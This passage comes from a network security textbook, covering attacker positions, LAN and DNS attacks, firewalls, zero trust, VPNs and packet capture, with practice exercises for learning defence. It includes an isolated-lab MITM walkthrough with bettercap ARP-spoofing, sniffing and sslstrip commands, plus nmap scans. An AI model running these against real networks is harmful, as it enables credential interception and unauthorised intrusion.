### Attacker positions (this framing runs through the whole Part)

```
   PASSIVE ON-PATH  -- can READ every packet, cannot change or inject.
                       A tap on a fibre; port mirroring; promiscuous Wi-Fi.
                       Beats: plaintext protocols. Defeated by: TLS/SSH
                       confidentiality (but traffic analysis still leaks).

   ACTIVE ON-PATH (MITM) -- can read, DROP, MODIFY, INJECT, DELAY.
                       A compromised router/switch/AP; ARP or DHCP spoofing
                       on a LAN; a malicious ISP; BGP hijack.
                       Beats: unauthenticated key exchange, downgrade-prone
                       protocols. Defeated by: authentication (certs, host
                       keys, HSTS) + integrity (AEAD).

   OFF-PATH        -- sees nothing, must GUESS/SPOOF (source IP, sequence
                       numbers, DNS transaction IDs, ports).
                       Beats: protocols with predictable identifiers or no
                       source validation. Defeated by: randomised IDs,
                       ingress/egress filtering, encryption.
```

Ask of any attack: **which position does it need?** It tells you the fix.

### Layer 2 (LAN) attacks

On a shared local network, an active attacker has cheap ways to become MITM:

```
   ARP SPOOFING / POISONING
     ARP maps IP -> MAC and has NO authentication. Attacker broadcasts
     "10.0.0.1 (the gateway) is at MY mac". Victims update their ARP cache
     and send all gateway-bound traffic to the attacker, who forwards it on.
     -> full active MITM for the subnet. Tools: arpspoof, bettercap, ettercap.

   DHCP SPOOFING (rogue DHCP)
     Attacker answers DHCP faster than the real server, hands out ITSELF as
     the default gateway and/or DNS. Same outcome: MITM.

   MAC FLOODING
     Flood the switch's CAM table until it "fails open" and floods all
     frames to every port -> the switch behaves like a hub -> passive
     sniffing of everyone.

   STP / LLMNR / NBT-NS / mDNS poisoning
     Windows name-resolution fallbacks with no auth -> Responder-style
     attacks capture NTLM hashes. VLAN hopping via DTP / double-tagging.

   ROGUE / EVIL-TWIN ACCESS POINT
     Broadcast the same SSID as the corporate/coffee-shop Wi-Fi with a
     stronger signal. Clients auto-associate. Attacker is now the network.
```

**Defences (switch/network side):**

```
   Dynamic ARP Inspection (DAI)  -- drop ARP replies that don't match a
                                    trusted DHCP-snooping binding table
   DHCP Snooping                 -- only allow DHCP offers from trusted ports
   Port Security                 -- limit MACs per port; sticky MACs
   802.1X / MACsec               -- authenticate the DEVICE before the port
                                    is usable; encrypt the link layer
   Disable DTP; prune VLANs; put unused ports in a black-hole VLAN
   Client isolation on guest Wi-Fi; WPA3-Enterprise; disable LLMNR/NBT-NS
```

**Host-side, the pragmatic truth:** you often can't control the LAN (coffee shop,
conference, a client site). So the working assumption is **the local network is
hostile**, and your protection is end-to-end: TLS with verification, SSH host-key
checking, a VPN, HSTS, DoH/DoT for DNS.

### On-path MITM against TLS — why it (mostly) fails

An active attacker who intercepts your HTTPS connection must present *some*
certificate for the site. Their options:

```
   * self-signed / wrong-name cert   -> browser refuses, no click-through
                                        under HSTS (Ch 31)
   * a REAL cert from a CA           -> they'd need to trick a CA into
                                        mis-issuing; CT (Ch 30) makes it
                                        detectable fast
   * a cert from a CA THEY CONTROL that's in your trust store
                                     -> this is exactly how corporate TLS
                                        inspection ("SSL/TLS interception")
                                        works: an internal root is pushed to
                                        managed devices. On such a device the
                                        padlock is real but the traffic IS
                                        being read by your employer's proxy.
   * strip TLS entirely (sslstrip)   -> only works if you first reach the
                                        site over HTTP; HSTS + preload kills
                                        it.
```

So: MITM on TLS requires a trust-store foothold or a CA failure. That's the
whole point of Parts 5–7.

### Off-path attacks worth knowing

```
   TCP sequence prediction / RST injection
     Off-path attacker guesses the 32-bit sequence number to inject data or
     forge a RST (connection reset). Modern stacks randomise ISNs; still
     used for censorship (the "Great Firewall" injects RSTs).

   DNS cache poisoning (Kaminsky, 2008) -- Chapter 38.

   BGP HIJACKING
     An AS announces routes for prefixes it doesn't own; traffic worldwide
     detours through it. Used to steal crypto (Amazon Route 53, 2018),
     intercept traffic, or just black-hole it. Defences: RPKI ROV (route
     origin validation), IRR filtering, peer prefix limits. As a service
     operator you also mitigate with TLS everywhere + DNSSEC + monitoring.

   IP SPOOFING + amplification (DDoS)
     Forge the victim's source IP, send small queries to servers (DNS, NTP,
     memcached, CLDAP) that reply with much larger responses AT the victim.
     Defence: BCP 38 / uRPF ingress filtering at every network edge;
     don't run open resolvers/reflectors.
```

### Practice (30 min) — safe, on your own machine/lab only

```bash
# 1. See who's on your LAN and your ARP table (read-only)
arp -a
ip neigh 2>/dev/null || arp -an
#   note: ARP has no auth -- any of these entries could be spoofed.

# 2. Passive capture: watch DNS + plaintext on your own interface
sudo tcpdump -i any -n -s0 'udp port 53' -c 20
sudo tcpdump -i any -n -A 'tcp port 80' -c 40        # see plaintext HTTP

# 3. Prove TLS resists a passive sniffer: capture your own HTTPS and try
#    to read it
sudo tcpdump -i any -w /tmp/h.pcap 'host example.com and tcp port 443' -c 60 &
curl -s https://example.com -o /dev/null; sudo pkill tcpdump
#    open /tmp/h.pcap in Wireshark -> only ClientHello/ServerHello readable.

# 4. Detect a (simulated) MITM: pin then compare a cert fingerprint
echo | openssl s_client -connect example.com:443 -servername example.com \
  2>/dev/null | openssl x509 -noout -fingerprint -sha256
#    run this from two networks (home, phone hotspot) -- fingerprints must match.

# 5. Are you behind TLS interception right now? Check your trust store for
#    unexpected roots.
security dump-keychain 2>/dev/null | grep -i "labl" | grep -iE "proxy|zscaler|bluecoat|netskope|forcepoint|corp" || echo "no obvious interception root (macOS)"
#   Linux: ls /usr/local/share/ca-certificates/  and  /etc/ssl/certs
```

**Lab-only (isolated VMs you own):** run `bettercap` or `arpspoof` between two VMs
on a host-only network, watch one become MITM, then enable Dynamic ARP Inspection
(or static ARP entries) and watch it fail. **Never on a network you don't own —
Chapter 0.6.**

### Common confusions

- **"I'm on HTTPS so hostile Wi-Fi can't hurt me."** Mostly true for
  confidentiality/integrity of each connection — but DNS, SNI, traffic size, and
  any HTTP-first request still leak, and a captive portal / evil twin can still
  ruin your day. A VPN narrows this.
- **"ARP spoofing is old / patched."** ARP has no authentication; it's mitigated
  by *switch features* you may not control. On an untrusted LAN it's live.
- **"Corporate TLS inspection breaks TLS security."** It relocates the trust
  boundary: your employer's proxy is a sanctioned MITM via a root on your
  managed device. The crypto is intact; the endpoint you're trusting changed.
- **"Off-path attackers are harmless."** Sequence/ID prediction, DNS poisoning,
  and BGP hijacks are all off-path and all serious.

### Check yourself

1. Define the three attacker positions and give one attack and one defence for
   each.
2. Why does ARP spoofing work, and what switch feature stops it?
3. What must an active attacker obtain to MITM a TLS connection to an
   HSTS-preloaded site?
4. How does corporate "TLS inspection" actually work, and is the padlock lying?
5. What is a BGP hijack, and name one real incident.

*(Answers: Appendix F.)*

### Further reading

- **Book:** *The Practice of Network Security Monitoring*, Richard Bejtlich — how
  defenders watch networks.
- **Tool + docs:** `bettercap` documentation (the LAN-attack toolkit, for your
  lab); Wireshark's sample-captures wiki.
- **Article:** "A Deep Dive into ARP Spoofing" and Cloudflare's "What is BGP
  hijacking?" learning-centre pages.
- **RFC:** BCP 38 (RFC 2827) — network ingress filtering. Short and important.
- **Course:** PortSwigger Web Security Academy (for the app side) + TryHackMe
  "Network Security" path (for the network side), both with legal lab targets.

---

## Chapter 38 — DNS security

### In one sentence

DNS was designed with no authentication, so an attacker who can answer (or guess)
a query controls where your traffic goes — and the fixes are DNSSEC (authenticate
the data) and DoH/DoT (encrypt the transport).

### How a lookup works, and where it's attackable

```
   your app -> STUB RESOLVER (OS) -> RECURSIVE RESOLVER (ISP / 1.1.1.1 /
               8.8.8.8 / your own) -> ROOT -> TLD (.op) -> AUTHORITATIVE
               (securesh.op's nameserver) -> answer flows back and is CACHED
               at the recursive resolver for the TTL.

   ATTACK SURFACE:
     [1] stub <-> recursive : on-path sniff/spoof; rogue DHCP sets a
                              malicious resolver; malware edits /etc/resolv.conf
     [2] recursive <-> auth : off-path CACHE POISONING (spoof the answer
                              before the real one arrives)
     [3] the recursive's cache itself, or a compromised resolver
     [4] the registrar / registry account -> DOMAIN HIJACK (change the NS
         records; game over, and it happens regularly)
     [5] the authoritative server or its zone file
```

### Cache poisoning and the Kaminsky attack (2008)

```
   A spoofed DNS response is accepted if it matches:
     - the 16-bit TRANSACTION ID
     - the source/dest IP and PORT
     - the question

   Classic attack: guess the 16-bit ID (65,536 values) while the resolver
   waits for an answer. Kaminsky's insight: you don't have to win once for
   one name -- query aaa.bank.com, bbb.bank.com, ... and each attempt is a
   fresh race, and a winning spoof can inject a poisoned NS record for the
   WHOLE zone. Suddenly feasible.

   MITIGATION (deployed 2008, still essential, NOT a real fix):
     * randomise the SOURCE PORT too  -> ~32 bits of entropy
     * 0x20 encoding (randomise query-name case)
     * these make it HARDER, not impossible. DNSSEC is the actual fix.
```

### DNSSEC — authenticating the answers

DNSSEC signs DNS records so a resolver can verify they're genuine and unmodified.

```
   Each zone signs its records (RRSIG) with a private key. The public key
   (DNSKEY) is vouched for by a hash (DS record) in the PARENT zone, which
   is itself signed... up to the ROOT, whose key is a well-known trust
   anchor (and whose rotation is a globally-televised ceremony).

     . (root, trust anchor)
       signs DS for  .op
         .op signs DS for  securesh.op
           securesh.op signs its own A / MX / TXT ... records

   A VALIDATING resolver rejects answers that fail the chain -> cache
   poisoning and on-path answer forgery stop working.
```

**What DNSSEC does and doesn't do:**

```
   DOES:  data-origin authentication + integrity for DNS records.
          Authenticated denial of existence (NSEC/NSEC3): "that name
          really doesn't exist" is provable.
   DOES NOT: encrypt anything (queries/answers are still public --
             that's DoH/DoT's job).
   DOES NOT: protect the stub <-> recursive hop unless that hop also
             validates and you trust it (or you validate locally).
   COSTS:  key management, signing, larger responses (UDP fragmentation,
           amplification-DDoS potential), operational foot-guns (an
           expired RRSIG = your domain vanishes for validating resolvers).
   ADOPTION: patchy. Most TLDs signed; a minority of second-level domains.
```

DNSSEC also enables **DANE** (TLSA records: "here's the exact cert my mail server
uses") — widely used to secure SMTP between mail servers, rarely for the web
(browsers didn't adopt it; they rely on the CA/CT system instead).

### Encrypted DNS transport: DoT and DoH

```
   Plain DNS (port 53, UDP/TCP): everyone on-path sees every name you
   resolve, and can tamper (if not DNSSEC-validated).

   DoT  -- DNS over TLS, port 853. Dedicated port -> easy to see "DNS is
           happening" and to block, but content is encrypted.
   DoH  -- DNS over HTTPS, port 443. Looks like normal web traffic ->
           hard to block or distinguish; also usable from inside browsers.
   DoQ  -- DNS over QUIC, port 853. DoT's benefits without head-of-line
           blocking.

   These hide your queries from the LOCAL network and your ISP, moving
   that visibility to your chosen resolver (Cloudflare, Google, Quad9,
   NextDNS, or your own). Trade-off: you must trust that operator, and
   enterprises lose DNS-based filtering/visibility (hence "enterprise
   DoH" controls and DDR/DNR discovery).
```

**DNSSEC and DoH/DoT are complementary:** DNSSEC = *is this answer authentic?*
DoH/DoT = *who got to watch me ask?* Ideally both.

### Domain-level hygiene (the boring stuff that prevents disasters)

```
   [ ] Registrar account: unique password + phishing-resistant MFA;
       REGISTRY LOCK (a manual, out-of-band step to change NS/transfer) --
       this alone stops most domain hijacks.
   [ ] CAA records (Ch 30) so only your CA can issue certs.
   [ ] SPF, DKIM, DMARC (p=reject) so nobody spoofs your email domain;
       MTA-STS + TLS-RPT for inbound mail transport security.
   [ ] Watch for dangling records: a CNAME to a decommissioned S3
       bucket / Heroku app / Azure resource -> SUBDOMAIN TAKEOVER.
       Inventory and prune DNS regularly.
   [ ] Separate, minimal-privilege accounts for DNS management; audit logs.
   [ ] Monitor: alerts on any NS / MX / DS / A change to your zones;
       external checks that your domain still resolves and validates.
   [ ] DNSSEC if your registrar/DNS host supports easy signing + managed
       key rollover. If they don't automate it, the operational risk may
       outweigh the benefit -- decide deliberately.
```

### Practice (35 min)

```bash
# 1. Trace a resolution and see the hierarchy
dig +trace securesh.op          # root -> TLD -> authoritative
dig +norecurse @a.root-servers.net NS op.    # ask root directly

# 2. Inspect DNSSEC
dig +dnssec cloudflare.com A                 # look for the RRSIG records
dig DS cloudflare.com                        # the delegation hash in the parent
dig +dnssec dnssec-failed.org A              # a deliberately-broken domain

# 3. Validate the chain explicitly
delv cloudflare.com A                        # "fully validated" (needs a
                                             # crypto-capable delv build;
                                             # macOS's may say "no crypto support"
                                             # -- another Ch 0.4 trap; use Linux
                                             # or `dig +sigchase`, or unbound-host)

# 4. See a poisoning mitigation in action: source-port randomisation
sudo tcpdump -i any -n 'udp port 53' -c 10 &
for i in 1 2 3 4 5; do dig +short example$i.com; done
sudo pkill tcpdump
#   note the SOURCE port differs every query -- that's the anti-Kaminsky entropy.

# 5. Encrypted DNS
kdig -d @1.1.1.1 +tls-ca +tls-host=cloudflare-dns.com example.com  # DoT (knot-dnsutils)
curl -s -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'    # DoH (JSON)

# 6. Check your domain's email + CAA posture
dig +short TXT example.com | grep -i spf
dig +short TXT _dmarc.example.com
dig +short CAA example.com

# 7. Subdomain-takeover sweep (your domains only): list CNAMEs and check
#    each target still exists
dig +short CNAME assets.example.com
```

### Mini-project (45 min): DNS + domain monitor

```
   A script (cron, every 15 min) that for each zone you own:
     1. Resolves NS, MX, DS, SOA, and key A/AAAA records.
     2. Diffs against a committed baseline; alerts loudly on any change.
     3. Runs `delv` / a validating query and alerts if DNSSEC validation
        fails (expired RRSIG is a classic 2 a.m. incident).
     4. For every CNAME, checks the target resolves (dangling -> takeover
        risk).
     5. Confirms CAA, SPF, and DMARC records are present and unchanged.
   Output: OK / WARN / CRIT, exit codes for your monitoring system.
```

### Common confusions

- **"DNSSEC encrypts my DNS."** No. It *authenticates* records. Encryption is
  DoH/DoT/DoQ. You want both.
- **"I use 1.1.1.1 so my DNS is secure."** It encrypts stub→resolver and 1.1.1.1
  validates DNSSEC for you — but you're now trusting Cloudflare to see every name
  you look up, and the answer's authenticity still depends on the zone being
  signed.
- **"DNS over HTTPS is always more private."** More private from the *local
  network*; less private from the DoH provider, and it can bypass enterprise
  security controls. Context matters.
- **"Cache poisoning was fixed in 2008."** Source-port randomisation made it
  *hard*. Researchers keep finding side channels (SAD DNS, 2020/2021). DNSSEC is
  the durable fix.
- **"My domain can't be hijacked, I have a strong password."** Registrar-account
  phishing and social-engineering the registrar are the common paths. Registry
  Lock is the control.

### Check yourself

1. Name three points in the DNS resolution path where an attacker can interfere.
2. What made the Kaminsky attack powerful, and what mitigations were deployed
   (and why aren't they a true fix)?
3. What does DNSSEC provide, and name two things it does *not* do.
4. DoT vs DoH — the port, and the practical trade-off between them.
5. What is Registry Lock and which attack does it stop?
6. What is a dangling DNS record and what attack does it enable?

### Further reading

- **Book:** *DNS and BIND* (5th ed.) for fundamentals; *DNSSEC Mastery* (2nd ed.),
  Michael W. Lucas, for the signing side.
- **Article:** "An Illustrated Guide to the Kaminsky DNS Vulnerability"
  (unixwiz.net) — the classic explainer. Plus "SAD DNS" (UC Riverside, 2020) for
  the modern revival.
- **Docs:** Cloudflare Learning Center "DNSSEC" and "DNS over HTTPS" pages;
  `RFC 4033-4035` (DNSSEC), `RFC 8484` (DoH), `RFC 7858` (DoT).
- **Tool:** `dnsviz.net` — visualises a domain's DNSSEC chain and flags problems.
- **Guidance:** ICANN's Registry Lock explainer; the CISA "Emergency Directive
  19-01" on DNS infrastructure tampering (a real campaign, well documented).

---

## Chapter 39 — Firewalls, segmentation, zero trust, and VPNs

### In one sentence

Perimeter firewalls and network segmentation limit *where* an attacker can go
once inside; zero trust drops the assumption that "inside" is safe; VPNs extend an
authenticated encrypted boundary across untrusted networks.

### Firewalls — what each type actually does

```
   PACKET FILTER (stateless)       allow/deny by IP, port, protocol, flags.
                                   Fast, dumb, no memory of connections.

   STATEFUL FIREWALL               tracks connection state (NEW/ESTABLISHED/
                                   RELATED). "Allow replies to connections I
                                   let out." The default model: nftables,
                                   pf, iptables, AWS security groups (SGs are
                                   stateful; NACLs are stateless).

   APPLICATION / NEXT-GEN (NGFW)   parses L7: HTTP, TLS SNI, app-ID; can do
                                   IPS, URL filtering, user-ID. A WAF (Part 10)
                                   is the web-specific cousin.

   HOST firewall                   on the endpoint itself (nftables/ufw,
                                   Windows Defender FW). Defence in depth --
                                   survives a breached perimeter.
```

**Default-deny is the only sane posture:** deny everything inbound, allow the
specific ports you serve; deny outbound by default too on sensitive segments
(egress filtering catches exfiltration and C2 callbacks).

```
   Minimal server ruleset (concept):
     inbound:  allow tcp 443 from anywhere
               allow tcp 22  from bastion_subnet only
               allow established/related
               deny  all (log)
     outbound: allow tcp 443 to package-mirrors, monitoring, APIs you call
               allow udp 53  to your resolvers
               deny  all (log)   <- an alert here often means "we're breached"
```

### Segmentation — blast-radius control

```
   FLAT NETWORK: one compromised web server can reach the database, the
   domain controller, the backup server, every workstation. Ransomware
   loves a flat network.

   SEGMENTED:
     +------------+   +-------------+   +-----------+   +-----------+
     |  DMZ       |   | app tier    |   | data tier |   | mgmt/     |
     |  web/proxy |-->| services    |-->| DB, cache |   | bastion   |
     +------------+   +-------------+   +-----------+   +-----------+
       only :443       only from DMZ     only from       only from
       from internet   on service ports  app tier on     admin VPN,
                                         5432            to all tiers

   Each boundary = a firewall/SG rule. East-west traffic is filtered, not
   just north-south. MICROSEGMENTATION takes this to per-workload identity
   (service mesh, host firewalls driven by labels, Illumio-style).
```

### Zero trust

```
   OLD MODEL ("castle and moat"): authenticate at the perimeter; once
   inside the VPN/LAN you're trusted. One breach -> lateral movement
   everywhere.

   ZERO TRUST (NIST SP 800-207): "never trust, always verify."
     * No implicit trust from network location. The office LAN is treated
       like the internet.
     * Every request to every resource is authenticated (strong user
       identity + device posture) and authorised (least privilege,
       policy-based), per-session, and logged.
     * Access is brokered by a policy enforcement point in front of each
       app -- not a flat network tunnel.
     * mTLS / SPIFFE identities between services (Part 7).

   In practice: identity-aware proxies (BeyondCorp, Cloudflare Access,
   Tailscale, Teleport), device attestation, short-lived credentials
   (Part 8 certs), and per-app authorisation instead of "on the VPN = in".
```

Zero trust doesn't abolish firewalls and segmentation — it *adds* identity as the
primary control so a network foothold alone buys the attacker very little.

### VPNs — what they are actually for

```
   A VPN gives you an AUTHENTICATED, ENCRYPTED tunnel over an untrusted
   network, and makes remote devices appear on (a slice of) a trusted one.

   LEGITIMATE USES:
     * remote workers reaching internal services
     * site-to-site links between offices/clouds
     * protecting traffic on hostile Wi-Fi (though TLS already covers most)
     * hiding your source IP / location from destination sites (commercial
       "privacy" VPNs -- you're trusting the VPN provider instead of the ISP)

   WHAT A VPN IS NOT:
     * not anonymity (the provider sees everything; so can they log it)
     * not a substitute for endpoint security or app authz
     * not "zero trust" -- a classic full-tunnel VPN is the castle-and-moat
       model; compromise a VPN-connected laptop and you're on the LAN
```

### The VPN protocols

| Protocol | Crypto | Notes |
|---|---|---|
| **WireGuard** | Curve25519, ChaCha20-Poly1305, BLAKE2s, fixed suite | ~4k lines, in-kernel, fast, hard to misconfigure. **Default choice.** Roaming-friendly. No crypto agility (by design). |
| **IPsec (IKEv2)** | negotiable (AES-GCM, etc.) | The standards-based incumbent; strong when configured well; complex; great vendor support; MOBIKE for roaming. |
| **OpenVPN** | TLS-based (OpenSSL), any TLS suite | Mature, flexible, runs over TCP/UDP 443 (NAT/firewall friendly); slower than WireGuard; userspace. |
| **TLS-based commercial** (e.g. AnyConnect/OpenConnect) | TLS/DTLS | Enterprise remote-access; captive-portal friendly. |
| PPTP, L2TP-only, IKEv1 | broken / legacy | **Do not use.** PPTP's MS-CHAPv2 is crackable. |

```
   WireGuard mental model:
     - each peer has a static Curve25519 keypair (like SSH keys)
     - you list peers by public key + allowed source IPs (a crypto-keyed
       routing table)
     - handshake every ~2 min (Noise protocol), forward secret
     - "AllowedIPs" is BOTH the routing rule AND the ACL -- get it right
     - add a PresharedKey per peer for a post-quantum hedge today
     - it's silent: no response to unauthenticated packets (stealthy,
       but you add your own liveness monitoring)
```

### Practice (40 min)

```bash
# 1. Read your current firewall state
sudo nft list ruleset 2>/dev/null || sudo iptables -S    # Linux
# macOS: sudo pfctl -sr ; sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
#   Identify: is it default-deny inbound? what's allowed? any egress rules?

# 2. Build a minimal default-deny ruleset in a throwaway VM/container (nft)
sudo nft -f - <<'EOF'
table inet filter {
  chain input {
    type filter hook input priority 0; policy drop;
    ct state established,related accept
    iif "lo" accept
    tcp dport 22 ip saddr 10.0.0.0/24 accept
    tcp dport 443 accept
    ct state invalid drop
    counter comment "dropped"
  }
  chain output { type filter hook output priority 0; policy accept; }
}
EOF
sudo nft list ruleset

# 3. Test segmentation logic with nmap (against hosts you own / your lab)
nmap -sS -p 22,80,443,5432 10.0.20.0/24        # what's reachable from here?
#   run the same scan from different segments and compare -- that's your
#   segmentation, verified.

# 4. Stand up WireGuard between two machines/VMs you control
umask 077
wg genkey | tee a.key | wg pubkey > a.pub
wg genkey | tee b.key | wg pubkey > b.pub
# peer A:
sudo ip link add wg0 type wireguard
sudo ip addr add 10.9.0.1/24 dev wg0
sudo wg set wg0 private-key ./a.key listen-port 51820 \
     peer "$(cat b.pub)" allowed-ips 10.9.0.2/32 endpoint <B_IP>:51820
sudo ip link set wg0 up
# peer B mirrors it with 10.9.0.2/24 and peer=A. Then:
ping 10.9.0.2
sudo wg show           # handshake time, transfer, endpoint

# 5. Confirm the tunnel is encrypted + authenticated
sudo tcpdump -i <wan_iface> -n udp port 51820 -c 10   # opaque UDP, no plaintext
#   send an unauthenticated packet -> no reply (WireGuard is silent).

# 6. Egress-filtering demo: block outbound 443 except to one host, then
#    watch a "curl https://example.com" fail and your rule counter tick.
```

### Mini-project (60 min): segment SecureShop

```
   Model SecureShop (Ch 4) as 4 segments in Docker networks or VMs:
     edge (nginx :443)  |  app (orders-api :8080)  |  data (postgres :5432)
     |  mgmt (bastion :22)

   1. Write firewall rules so:
      - internet -> edge:443 only
      - edge -> app:8080 only
      - app -> data:5432 only
      - mgmt -> everything on :22 only; nothing -> mgmt except admin VPN
      - default deny inbound AND outbound on data (allow only 5432 from app
        + DNS + package mirror)
   2. From a shell in each segment, run nmap at the others. Produce a
      reachability matrix and confirm it matches the intended design.
   3. "Compromise" the edge container (you have a shell). Show you can reach
      app:8080 but NOT data:5432 directly, and not mgmt at all.
   4. Add host firewalls on app and data as defence in depth; re-test.
   5. Bonus: put app<->data on mTLS (Part 7) so even reachable != usable.
   6. Write ~/sec-lab/reports/part9-network.md with the matrix and findings.
```

### Common confusions

- **"The firewall makes us secure."** It controls reachability. It does nothing
  about a vulnerable app on an allowed port, or a phished credential. Defence in
  depth.
- **"We have a VPN, so we're zero trust."** Opposite — a full-tunnel VPN is the
  castle-and-moat model. Zero trust authorises every request per-app regardless
  of network position.
- **"Egress filtering is paranoid."** Outbound rules are how you catch and slow
  data exfiltration and malware C2. On sensitive segments they're essential.
- **"WireGuard has no crypto agility — that's bad."** It's a deliberate
  simplification that removes negotiation-downgrade bugs; you rev the whole
  protocol version instead. Add a PresharedKey for PQ hedging.
- **"Internal = trusted."** Flat internal networks are why one phished laptop
  becomes company-wide ransomware. Segment.

### Check yourself

1. Stateful vs stateless firewall — what does "stateful" buy you?
2. What is the security value of network segmentation, in one phrase?
3. State the zero-trust principle and how it differs from castle-and-moat.
4. What is a VPN good for, and name two things it is *not*.
5. Why is WireGuard's lack of cipher negotiation considered a feature?
6. What does `AllowedIPs` do in WireGuard (two roles)?

### Further reading

- **Standard:** NIST SP 800-207, *Zero Trust Architecture* — readable, the
  canonical reference. Plus Google's BeyondCorp papers.
- **Book:** *Zero Trust Networks* (2nd ed.), Gilman & Barth.
- **Docs:** WireGuard whitepaper (`wireguard.com/papers/wireguard.pdf`) — short
  and excellent; `nftables` wiki; `strongSwan` IKEv2 docs.
- **Guidance:** CISA Zero Trust Maturity Model; PCI-DSS segmentation guidance
  (even if you're not doing payments, it's a good checklist).
- **Article:** "How WireGuard works" (Tailscale blog) and Julia Evans's firewall
  zines.

---

## Chapter 40 — Hands-on: seeing the network

### Why this chapter exists

Every claim in Parts 7–9 is checkable with a packet capture. Being able to
capture, filter, and read traffic — and to run a safe attack in your own lab —
turns theory into intuition.

### `tcpdump` — capture anywhere

```bash
# interfaces
sudo tcpdump -D

# basic: interface, no name resolution, snap full packets
sudo tcpdump -i any -n -s0

# write to a file for Wireshark; rotate to keep size sane
sudo tcpdump -i any -n -w /tmp/cap.pcap -C 100 -W 5   # 5 x 100MB ring

# read back with a display filter
tcpdump -n -r /tmp/cap.pcap 'tcp port 443'

# --- filters you'll actually use (BPF syntax) ---
sudo tcpdump -i any -n 'host 10.0.0.5'
sudo tcpdump -i any -n 'tcp port 443 and host example.com'
sudo tcpdump -i any -n 'udp port 53'                       # DNS
sudo tcpdump -i any -n 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'   # conn setup/teardown
sudo tcpdump -i any -n 'icmp'
sudo tcpdump -i any -nA 'tcp port 80'                      # ASCII payload (plaintext HTTP)
sudo tcpdump -i any -n 'not port 22'                       # exclude your ssh session
sudo tcpdump -i any -n 'net 10.0.0.0/8 and not net 10.0.20.0/24'
```

### Wireshark / `tshark` — read deeply

```bash
# terminal Wireshark
tshark -i any -f 'tcp port 443' -Y 'tls.handshake.type == 1'   # ClientHellos
tshark -r /tmp/cap.pcap -Y 'http.request' -T fields \
       -e ip.src -e http.request.method -e http.host -e http.request.uri
tshark -r /tmp/cap.pcap -q -z conv,tcp        # conversation summary
tshark -r /tmp/cap.pcap -q -z io,phs          # protocol hierarchy

# decrypt YOUR OWN TLS with a key log
SSLKEYLOGFILE=/tmp/keys.log curl -s https://example.com -o /dev/null
tshark -r /tmp/cap.pcap -o tls.keylog_file:/tmp/keys.log -Y http2

# Wireshark GUI display filters worth memorising:
#   tls.handshake            ip.addr == 10.0.0.5
#   http.response.code >= 400 dns.flags.rcode != 0
#   tcp.analysis.retransmission   tcp.flags.reset == 1
#   tls.record.version == 0x0301  (probes for old TLS)
```

### `nmap` — discovery and service inspection (your hosts / lab only)

```bash
nmap -sn 10.0.20.0/24                      # host discovery (ping sweep)
nmap -sS -T4 --top-ports 1000 10.0.20.5    # SYN scan, common ports
nmap -sV -sC -p 22,80,443 10.0.20.5        # version + default scripts
nmap --script ssl-enum-ciphers,ssl-cert -p 443 shop.securesh.op
nmap --script ssh2-enum-algos,ssh-auth-methods -p 22 app-01.internal
nmap -sU --top-ports 50 10.0.20.5          # UDP (slow)
nmap -A -oA scan_result 10.0.20.5          # everything; save 3 formats
```

> **Chapter 0.6, restated:** `nmap` against systems you don't own or have written
> permission to test can be a criminal offence. Lab, HTB/THM, and your own
> infrastructure only.

### A safe MITM lab (isolated, VMs you own)

```
   Setup: two VMs (victim, gateway-sim) + one attacker VM on a HOST-ONLY
   network with no route to anything real.

   1. On attacker: enable IP forwarding, then:
        sudo bettercap -iface eth1
        > set arp.spoof.targets 192.168.56.10
        > arp.spoof on
        > net.sniff on
   2. On victim: browse to the plaintext test app you host on gateway-sim.
      Watch credentials appear in bettercap's log.
   3. Now serve the app over HTTPS with a cert from your Ch 29 mini-CA
      (trusted on the victim). Repeat -- bettercap sees only TLS records.
   4. Try `set https.proxy on` (sslstrip-style). It works UNTIL you add an
      HSTS header (Ch 31) -- then the browser refuses the downgrade.
   5. On gateway-sim's switch/bridge, add static ARP entries (or enable
      DAI on a real managed switch) and watch step 1 stop working.

   Deliverable: ~/sec-lab/reports/part9-mitm.md -- what each layer of
   defence (TLS, cert validation, HSTS, DAI) removed from the attacker.
```

### Practice / drill (45 min)

1. Capture your own DNS for 60 s. List every domain your machine looked up.
   Anything surprising? (Telemetry, ad/track domains, OS phone-home.)
2. Capture a single `curl https://example.com`. In Wireshark, identify: the
   ClientHello (and the SNI), the ServerHello, where handshake bytes stop being
   readable, and the first Application Data record. Note you cannot read the
   HTTP.
3. Re-do (2) with `SSLKEYLOGFILE` set and Wireshark configured — now read the
   HTTP/2 request and response.
4. `nmap -sV` your own laptop/router. For every open port, name the service and
   decide: should that be exposed? Close one.
5. Run `nmap --script ssl-enum-ciphers` against a site you use. Cross-check the
   result against Chapter 31's "sane config".
6. In your MITM lab, produce the defence-by-defence table from the deliverable
   above.

### Common confusions

- **"tcpdump needs root for no reason."** Raw packet capture is a privileged
  operation (you'd otherwise sniff other users/containers). Use capabilities
  (`cap_net_raw`) or a capture group instead of full root where possible.
- **"I set a capture filter and a display filter — same syntax."** No. `tcpdump`
  / `-f` use **BPF** (`tcp port 443`); Wireshark `-Y` / the GUI use **display
  filters** (`tls.handshake.type == 1`). Different languages.
- **"Wireshark can decrypt any TLS."** Only with the session keys — via
  `SSLKEYLOGFILE` for traffic *you* generate, or the server's private key for
  *non-forward-secret* RSA handshakes (which barely exist now).
- **"nmap is just information gathering, it's harmless/legal."** Unsolicited
  scanning of third parties is treated as hostile and is illegal in many places.
- **"A clean nmap means the host is secure."** It means those ports/scripts found
  nothing. Says nothing about app logic, auth, or patch level.

### Check yourself

1. Write a `tcpdump` filter for "DNS traffic or TLS traffic to 10.0.0.5, but not
   my SSH session".
2. What's the difference between a capture filter and a display filter?
3. How do you make Wireshark decrypt your own HTTPS session?
4. From `nmap`, which flags give you service versions and which run the default
   script set?
5. In the MITM lab, which single defence stops the sslstrip downgrade, and why?

### Further reading

- **Book:** *Practical Packet Analysis* (3rd ed.), Chris Sanders — the best
  hands-on Wireshark book. And *Wireshark Network Analysis*, Laura Chappell.
- **Book:** *Nmap Network Scanning*, Fyodor (the author) — free chapters online.
- **Site:** Wireshark sample captures wiki; `packetlife.net` cheat sheets
  (tcpdump, Wireshark, Wireshark display filters).
- **Labs:** TryHackMe "Wireshark" and "Nmap" rooms; `malware-traffic-analysis.net`
  (real pcaps with exercises — defensive analysis practice).
- **Tool docs:** `man pcap-filter` (BPF syntax), `tshark(1)`, bettercap docs.

---

### End of Part 9 — Milestone check

- [ ] I can classify any network attack by the position it needs (passive
      on-path / active on-path / off-path) and give the matching defence
